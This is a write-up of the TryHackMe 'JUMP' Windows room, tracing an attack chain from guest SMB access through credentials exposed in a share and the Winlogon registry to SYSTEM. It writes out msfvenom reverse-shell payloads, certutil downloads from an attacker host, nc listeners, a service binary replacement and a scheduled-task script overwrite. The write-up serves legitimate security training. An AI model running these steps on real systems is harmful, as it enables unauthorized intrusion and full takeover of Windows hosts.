# TryHackMe — JUMP (Windows)

> **Platform:** TryHackMe  
> **Room:** JUMP — Windows  
> **Focus:** SMB enumeration, credential discovery, RDP access, Windows privilege escalation, service binary hijacking, and scheduled task abuse.

---

## 1. Lab Information

| System | IP |
|---|---|
| Attacker | `10.48.71.240` |
| Target | `10.48.158.114` |

---

# 2. Initial Enumeration

Perform a full Nmap scan with OS and service detection:

```bash
nmap -A 10.48.158.114
```

### Open Ports

| Port | Service | Information |
|---|---|---|
| `135/tcp` | MSRPC | Microsoft Windows RPC |
| `139/tcp` | NetBIOS | Microsoft NetBIOS |
| `445/tcp` | SMB | Microsoft-DS |
| `3389/tcp` | RDP | Microsoft Terminal Services |

The target was identified as:

```text
Microsoft Windows Server 2019
Build 17763
Hostname: PRIVESC
Domain: privesc
```

SMB signing was enabled but not required.

---

# 3. SMB Enumeration

Since SMB was available, enumerate the accessible shares using NetExec:

```bash
nxc smb 10.48.158.114 -u 'Guest' -p '' --shares
```

Guest authentication succeeded:

```text
[+] privesc\Guest:
```

The important share was:

```text
Public    READ    Public file share
```

This provided a readable SMB share without requiring valid credentials.

---

# 4. Initial Access — Discovering Credentials

Connect to the `Public` share:

```bash
smbclient //10.48.158.114/Public -U 'Guest'
```

List the files:

```text
smb: \> ls
```

A file named `welcome.txt` was found.

Download it:

```text
smb: \> get welcome.txt
```

Read it locally:

```bash
cat welcome.txt
```

The file contained default employee credentials:

```text
Username : thmuser
Password : Password1!
```

### Key Finding

The public SMB share exposed valid credentials for the `thmuser` account.

---

# 5. RDP Access

Nmap identified RDP on port `3389`, and valid credentials were now available.

Connect using an RDP client:

```bash
xfreerdp /u:thmuser /p:'Password1!' /v:<TARGET_IP> /dynamic-resolution
```

This provided remote desktop access as:

```text
PRIVESC\thmuser
```

---

# 6. Flag 1 — `thmuser`

Enumerate the user's home directory:

```cmd
C:\Users>dir
```

Navigate to the Desktop:

```cmd
cd C:\Users\thmuser\Desktop
dir
```

The directory contained:

```text
flag1.txt
```

Read it:

```cmd
type flag1.txt
```

```text
THM{5mb_cr3d...............}
```

---

# 7. Credential Discovery — Winlogon Registry

Enumerate Windows registry settings related to automatic logon:

```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

Relevant entries:

```text
AutoAdminLogon    REG_SZ    1
DefaultUserName   REG_SZ    notadmin
DefaultPassword   REG_SZ    P@ssw0rd!
AutoLogonSID      REG_SZ    S-1-5-21-...
LastUsedUsername  REG_SZ    notadmin
```

### Key Finding

The registry exposed credentials for the `notadmin` account:

```text
Username: notadmin
Password: P@ssw0rd!
```

This demonstrates the risk of storing credentials in Windows auto-logon configuration.

---

# 8. Access as `notadmin`

Use the discovered credentials to start a command shell under the `notadmin` account:

```cmd
runas /user:PRIVESC\notadmin cmd.exe
```

After authentication, enumerate the system from the new user context.

---

# 9. Service Enumeration

Enumerate Windows services and their executable paths:

```cmd
wmic service get name,pathname,startname | findstr /i "svcadmin"
```

The relevant service was:

```text
THMSvc    C:\Windows\THMSVC\svc.exe    .\svcadmin
```

### Important Observation

The `THMSvc` service executes:

```text
C:\Windows\THMSVC\svc.exe
```

and runs as:

```text
.\svcadmin
```

Check permissions on the service directory:

```cmd
icacls C:\Windows\THMSVC\
```

Result:

```text
PRIVESC\notadmin:(OI)(CI)(F)
BUILTIN\Administrators:(OI)(CI)(F)
NT AUTHORITY\SYSTEM:(OI)(CI)(F)
```

The `notadmin` account had **Full Control** over the directory containing the service executable.

---

# 10. Service Binary Hijacking

Because `notadmin` could modify the directory containing `svc.exe`, the service executable could be replaced with a malicious executable.

Create a Windows reverse-shell executable on the attacking machine:

```bash
msfvenom -p windows/x64/shell_reverse_tcp \
LHOST=<ATTACKER_IP> \
LPORT=4444 \
-f exe-service \
-o svc.exe
```

Start a temporary HTTP server:

```bash
python -m http.server 8000
```

Start a listener in another terminal:

```bash
nc -lvnp 4444
```

On the Windows target, download the replacement executable using `certutil`:

```cmd
certutil -urlcache -split -f http://<ATTACKER_IP>:8000/svc.exe C:\Windows\THMSVC\svc.exe
```

Verify the file:

```cmd
cd C:\Windows\THMSVC
dir
```

---

# 11. Restart the Vulnerable Service

Restart the service:

```cmd
sc stop THMSVC
sc start THMSVC
```

The service starts using the replaced `svc.exe`.

The listener receives the reverse connection, resulting in access in the service account context:

```text
svcadmin
```

### Attack Chain So Far

```text
Guest
  ↓
SMB Public Share
  ↓
thmuser
  ↓
Winlogon credential discovery
  ↓
notadmin
  ↓
Service binary hijacking
  ↓
svcadmin
```

---

# 12. Flag — `svcadmin`

Navigate to:

```cmd
C:\Users\svcadmin\Desktop
```

List the files:

```cmd
dir
```

The directory contained:

```text
flag3.txt
```

Read it:

```cmd
type flag3.txt
```

```text
THM{s3rv1c...................d}
```

---

# 13. Scheduled Task Enumeration

Inspect the Windows Tasks directory:

```cmd
cd C:\Windows\Tasks
dir
```

A batch file named:

```text
cleanup.bat
```

was found.

Read it:

```cmd
type cleanup.bat
```

Contents:

```bat
@echo off
del /Q /F "%TEMP%\*.tmp" 2>nul
```

Check its permissions:

```cmd
icacls cleanup.bat
```

Relevant permissions:

```text
BUILTIN\Users:(I)(RX)
PRIVESC\svcadmin:(I)(M)
BUILTIN\Administrators:(I)(F)
NT AUTHORITY\SYSTEM:(I)(F)
```

### Key Finding

`svcadmin` had **Modify** permission over `cleanup.bat`.

If this batch file is executed by a scheduled task running as SYSTEM, modifying it provides a path to SYSTEM-level execution.

---

# 14. Scheduled Task Abuse — SYSTEM

Create a reverse-shell executable:

```bash
msfvenom -p windows/x64/shell_reverse_tcp \
LHOST=<ATTACKER_IP> \
LPORT=4445 \
-f exe \
-o shell.exe
```

Host it from the attacking machine:

```bash
python -m http.server 8000
```

Start the listener:

```bash
nc -lvnp 4445
```

Download the payload to the target:

```cmd
certutil -urlcache -split -f http://<ATTACKER_IP>:8000/shell.exe C:\Windows\Tasks\shell.exe
```

Replace the vulnerable batch file with the payload path:

```cmd
cmd /c "echo C:\Windows\Tasks\shell.exe > C:\Windows\Tasks\cleanup.bat"
```

When the scheduled task executes `cleanup.bat`, the payload runs in the task's security context.

The resulting reverse shell provides SYSTEM-level access.

---

# 15. Final Flag — SYSTEM

Once SYSTEM access is obtained, enumerate the root of the C: drive:

```cmd
cd C:\
dir
```

The final flag was located at:

```text
C:\flag4.txt
```

Read it with:

```cmd
type C:\flag4.txt
```

> **Flag value:** `[REDACTED]`

The original notes contained a partially displayed flag and subsequently recorded it as `THM{REDACTED}`, so the exact value is intentionally not reproduced.

---

# 16. Attack Path Summary

```text
                         ┌──────────────────────┐
                         │    Nmap Enumeration  │
                         │   135/139/445/3389   │
                         └──────────┬───────────┘
                                    │
                                    ▼
                         ┌──────────────────────┐
                         │   SMB Guest Access   │
                         │   Public Share READ  │
                         └──────────┬───────────┘
                                    │
                                    ▼
                         ┌──────────────────────┐
                         │    welcome.txt       │
                         │  thmuser credentials │
                         └──────────┬───────────┘
                                    │
                                    ▼
                               thmuser
                                    │
                                    ▼
                         ┌──────────────────────┐
                         │ Winlogon Registry    │
                         │ AutoLogon credentials│
                         └──────────┬───────────┘
                                    │
                                    ▼
                               notadmin
                                    │
                                    ▼
                         ┌──────────────────────┐
                         │       THMSvc         │
                         │ Writable service EXE │
                         └──────────┬───────────┘
                                    │
                                    ▼
                               svcadmin
                                    │
                                    ▼
                         ┌──────────────────────┐
                         │     cleanup.bat      │
                         │ Writable by svcadmin │
                         └──────────┬───────────┘
                                    │
                                    ▼
                                  SYSTEM
```

---

# 17. Key Techniques Learned

## SMB Enumeration

```bash
nxc smb <TARGET> -u 'Guest' -p '' --shares
```

Used to identify accessible SMB shares and their permissions.

## Public Share Enumeration

```bash
smbclient //<TARGET>/Public -U 'Guest'
```

Public shares may contain configuration files, credentials, scripts, or other sensitive information.

## Windows Credential Discovery

```cmd
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```

Auto-logon configuration can expose credentials for additional accounts.

## Service Enumeration

```cmd
wmic service get name,pathname,startname
```

Look for:

- Services running as privileged users
- Writable service binaries
- Writable directories containing service executables
- Unquoted service paths
- Weak service permissions

## Service Binary Hijacking

If a lower-privileged user can modify a service executable that runs under another account, replacing the executable can lead to code execution in that account's security context.

## Scheduled Task Abuse

Writable scripts or executables executed by scheduled tasks can provide privilege escalation when the task runs under a more privileged account.

## Windows Permissions

`icacls` is useful for identifying who can read, modify, or fully control files and directories.

## File Transfer with `certutil`

```cmd
certutil -urlcache -split -f http://<ATTACKER_IP>:8000/file.exe C:\path\file.exe
```

`certutil` is a legitimate Windows utility that can also be used for file transfer during authorized lab exercises.

---

# 18. Lessons Learned

- Always enumerate SMB shares when ports `139` or `445` are open.
- Guest access can expose sensitive files even without a password.
- Public shares should always be inspected for credentials and configuration files.
- Windows registry locations can contain insecurely stored credentials.
- Enumerate services together with their executable paths and service accounts.
- File and directory permissions are critical during Windows privilege escalation.
- A writable service binary can provide access to another user's security context.
- Scheduled tasks should be checked for writable scripts and executables.
- `icacls` is essential for understanding Windows file and directory permissions.
- Built-in Windows utilities can be useful during authorized lab exercises.

---

## Disclaimer

This write-up documents techniques performed against an intentionally vulnerable TryHackMe training environment.

Do not apply these techniques to systems without explicit authorization.
